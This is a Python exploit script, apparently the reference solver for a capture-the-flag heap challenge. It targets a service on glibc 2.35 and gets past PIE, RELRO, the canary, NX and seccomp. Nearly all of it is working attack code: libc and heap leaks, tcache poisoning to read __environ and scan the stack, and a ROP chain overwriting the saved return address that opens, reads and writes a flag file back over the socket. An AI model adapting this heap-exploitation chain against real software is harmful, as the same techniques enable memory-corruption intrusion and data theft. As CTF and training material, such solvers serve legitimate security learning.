#!/usr/bin/env python3
"""
leonel_messi — GOAT Edition reference solver.

Heap-based chain against glibc 2.35 (Ubuntu 22.04), defeating Full
RELRO, PIE, canary, FORTIFY, NX, and a seccomp sandbox that blocks
exec. No ret2win.

    libc leak  — free a >tcache-max chunk to the unsorted bin, its
                 fd points into main_arena.
    heap leak  — free 2 same-size chunks to an empty tcache bin; the
                 tail's fd is the clean PROTECT_PTR(pos, NULL).
                 Decode the head's fd to recover the low 12 bits.
    env leak   — tcache poison to allocate at libc+__environ, RECALL
                 to read the stack top pointer.
    stack scan — plant a 32-byte marker inside session's body[4096]
                 via a RECORD frame; tcache-poison a large scan chunk
                 pointed below __environ, RECALL, search.
    RCE        — tcache-poison to write ROP over session's saved RIP,
                 send CEREMONY → session returns → openat/read/write.

Budget: ents[] only has 16 slots and RETIRE does NOT null the
pointer, so we have 16 RECORDs total per session. The chain uses 14.

Usage:  python3 solve.py <host> <port>
Env:    LEO_LIBC=./libc.so.6   (Ubuntu GLIBC 2.35-0ubuntu3.*)
"""
import os
import struct
import sys
import time

from client import LM10Client
from pwn import ELF, context, u64, p64, log  # type: ignore

context.arch = 'amd64'


# ── libc 2.35-0ubuntu3.* offsets ──────────────────────────────────
MAIN_ARENA_OFF   = 0x219c80
ARENA_BINS_FD    = 0x60            # &bins treated as chunk+0x10
ENVIRON_OFF      = 0x222200
POP_RDI_RET      = 0x2a3e5
POP_RSI_RET      = 0x2be51
POP_RDX_POP_RBX  = 0x904a9
POP_RAX_RET      = 0x45eb0
SYSCALL_RET      = 0x91316

# session()'s stack frame (from -O2 disassembly):
#   body[4096]  at rsp + 0x190
#   canary      at rsp + 0x1198
#   saved RIP   at rsp + 0x11d0
# so saved_RIP - body[0] = 0x1040.
SAVED_RIP_FROM_BODY0 = 0x1040

MARKER = b"\xde\xad\xbe\xef\xca\xfe\xba\xbe" * 4   # 32 bytes
FLAG_PATH = b"/home/ctf/flag.txt\x00"


def protect(pos, target):
    return (pos >> 12) ^ target


# ── stage 1: libc leak via unsorted bin ──────────────────────────
def libc_leak(c):
    big  = c.record(b"A" * 0x440)
    _grd = c.record(b"G" * 0x60)
    c.retire(big)
    fd = u64(c.recall(big)[:8])
    libc_base = fd - ARENA_BINS_FD - MAIN_ARENA_OFF
    assert libc_base & 0xFFF == 0, f"libc base unaligned: {libc_base:#x}"
    # pull the chunk back out so the unsorted bin is drained
    _pull = c.record(b"R" * 0x440)
    return libc_base


# ── stage 2: heap leak via double tcache free ────────────────────
def heap_leak(c, size):
    i0 = c.record(b"P" * size)
    i1 = c.record(b"Q" * size)
    c.retire(i0)
    c.retire(i1)
    fd0 = u64(c.recall(i0)[:8])
    fd1 = u64(c.recall(i1)[:8])
    # fd0 is clean pos0>>12 if the bin was empty on retire(i0).
    # fd1 = (pos1>>12) ^ pos0.  If pos0 and pos1 live in the same
    # page, (pos1>>12) == fd0, so pos0 = fd0 ^ fd1.
    pos0 = fd0 ^ fd1
    if (pos0 >> 12) != fd0:
        # pos1 crossed a page boundary — retry with adjacent page
        # indices until the sanity check holds.
        for bump in (1, -1, 2, -2):
            candidate_shift = fd0 + bump
            cand = fd1 ^ candidate_shift
            if (cand >> 12) == fd0:
                pos0 = cand; break
        else:
            raise RuntimeError(f"heap leak sanity failed (fd0={fd0:#x} fd1={fd1:#x})")
    return pos0


# ── stage 3: tcache-poison primitive ─────────────────────────────
def poison_alloc(c, size, victim_heap_pos, target, content=None):
    """Return the (target-placed) chunk's ent-idx.  Consumes three
       ent[] slots: victim, pulled-from-tcache, target."""
    victim = c.record(b"V" * size)
    c.retire(victim)
    c.reforge(victim, 0, p64(protect(victim_heap_pos, target)))
    _pulled = c.record(b"X" * size)
    payload = (content or b"").ljust(size, b"\x00")[:size]
    tgt = c.record(payload)
    return tgt


# ── stage 4: build syscall ROP chain ─────────────────────────────
def build_rop(libc, flag_path_addr, buf_addr):
    pop_rdi = libc + POP_RDI_RET
    pop_rsi = libc + POP_RSI_RET
    pop_rdx = libc + POP_RDX_POP_RBX
    pop_rax = libc + POP_RAX_RET
    syscall = libc + SYSCALL_RET
    AT_FDCWD = (-100) & ((1 << 64) - 1)

    chain  = p64(pop_rdi) + p64(AT_FDCWD)
    chain += p64(pop_rsi) + p64(flag_path_addr)
    chain += p64(pop_rdx) + p64(0) + p64(0)
    chain += p64(pop_rax) + p64(257)               # openat
    chain += p64(syscall)

    chain += p64(pop_rdi) + p64(3)                 # flag_fd
    chain += p64(pop_rsi) + p64(buf_addr)
    chain += p64(pop_rdx) + p64(0x100) + p64(0)
    chain += p64(pop_rax) + p64(0)                 # read
    chain += p64(syscall)

    chain += p64(pop_rdi) + p64(4)                 # client sock
    chain += p64(pop_rsi) + p64(buf_addr)
    chain += p64(pop_rdx) + p64(0x100) + p64(0)
    chain += p64(pop_rax) + p64(1)                 # write
    chain += p64(syscall)

    chain += p64(pop_rax) + p64(60)                # exit
    chain += p64(syscall)
    return chain


# ── main exploit ─────────────────────────────────────────────────
def exploit(host, port, libc_path):
    libc_elf = ELF(libc_path)
    c = LM10Client(host, port)
    log.info("PoW (22 bits) ...")
    t0 = time.time()
    c.pass_pow()
    log.success(f"PoW cleared in {time.time()-t0:.1f}s")

    # ── stage 1: libc leak (3 slots) ────────────────────────────
    libc_base = libc_leak(c)
    log.success(f"libc base        = {libc_base:#x}")

    # ── stage 2: heap leak via bin 0x150 (user 0x138) (2 slots) ─
    heap_pos = heap_leak(c, 0x138)
    log.success(f"heap chunk idx0  = {heap_pos:#x}")

    # Each subsequent RECORD of this size-class pops a chunk that we
    # can assume sits in the same 4 KiB page until a clear boundary
    # crossing.  Keep bumping heap_pos for each new victim.
    next_heap = [heap_pos + 0x500]   # rough forward walk

    # ── stage 3: plant the marker in session's body[] stack buf ─
    # A RECORD frame's body layout is op(1) || size(2) || content.
    # body[] on the stack is exactly that frame body, so content
    # lives at body[3..3+size].  Pad to a common tcache bin size.
    marker_payload = MARKER + b"\xaa" * (0x138 - len(MARKER))
    _marker_record = c.record(marker_payload)

    # ── stage 4: poison to __environ, leak stack pointer ───────
    env_target = libc_base + ENVIRON_OFF
    env_tgt = poison_alloc(c, 0x138, next_heap[0], env_target)
    env_val = u64(c.recall(env_tgt)[:8])
    log.success(f"env value (stack) = {env_val:#x}")
    next_heap[0] += 0x1000

    # ── stage 5: scan stack below env_val for the marker ──────
    # Use a fresh size class (bin 0x410 → max tcache) for 0x400 read
    # windows. Start just below env_val.
    scan_size = 0x3f8                        # user, bin 0x410
    marker_offset_in_body = 3                # op(1)+size(2) prefix

    body0_addr = None
    scan_start = env_val - 0x1000            # start ~4 KiB below env
    for attempt in range(2):
        start = scan_start - attempt * scan_size
        scan_tgt = poison_alloc(c, scan_size, next_heap[0], start)
        next_heap[0] += 0x1000
        dump = c.recall(scan_tgt)
        if MARKER in dump:
            off = dump.index(MARKER)
            body3_addr = start + off
            body0_addr = body3_addr - marker_offset_in_body
            log.success(f"marker at {body3_addr:#x} → body[0] = {body0_addr:#x}")
            break
    if body0_addr is None:
        raise RuntimeError(
            f"marker not found in 2×{scan_size:#x} stack scan below {env_val:#x}"
        )
    saved_rip_addr = body0_addr + SAVED_RIP_FROM_BODY0
    log.success(f"saved RIP addr    = {saved_rip_addr:#x}")

    # ── stage 6: tcache-poison over saved RIP and drop ROP ─────
    rop_size = 0x1a8                         # bin 0x1c0, room for chain+path
    # Lay out: [ROP chain][flag path][padding].  Compute the chain
    # twice — first with dummy pointers to get its length, then with
    # real addresses relative to saved_rip_addr.
    dummy = build_rop(libc_base, 0, 0)
    path_off   = len(dummy)
    scratch_off = path_off + len(FLAG_PATH)
    chain = build_rop(libc_base,
                      saved_rip_addr + path_off,
                      saved_rip_addr + scratch_off)
    assert len(chain) == path_off
    payload = chain + FLAG_PATH
    payload = payload.ljust(rop_size, b"\x90")
    assert len(payload) <= rop_size

    _ = poison_alloc(c, rop_size, next_heap[0], saved_rip_addr, payload)

    # ── stage 7: trigger session return → ROP fires ────────────
    log.info("CEREMONY → session returns → ROP fires")
    try:
        c.send_frame(bytes([0x63]))
    except Exception:
        pass

    # ── collect the flag ───────────────────────────────────────
    data = b""
    try:
        c.sock.settimeout(5)
        while True:
            chunk = c.sock.recv(4096)
            if not chunk:
                break
            data += chunk
    except Exception:
        pass

    if not data:
        log.failure("no payload back — check offsets / gadgets")
        return
    log.success("raw response:")
    print(data.decode(errors="replace"))


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 1337
    libc_path = os.environ.get("LEO_LIBC", "./libc.so.6")
    exploit(host, port, libc_path)


if __name__ == "__main__":
    main()
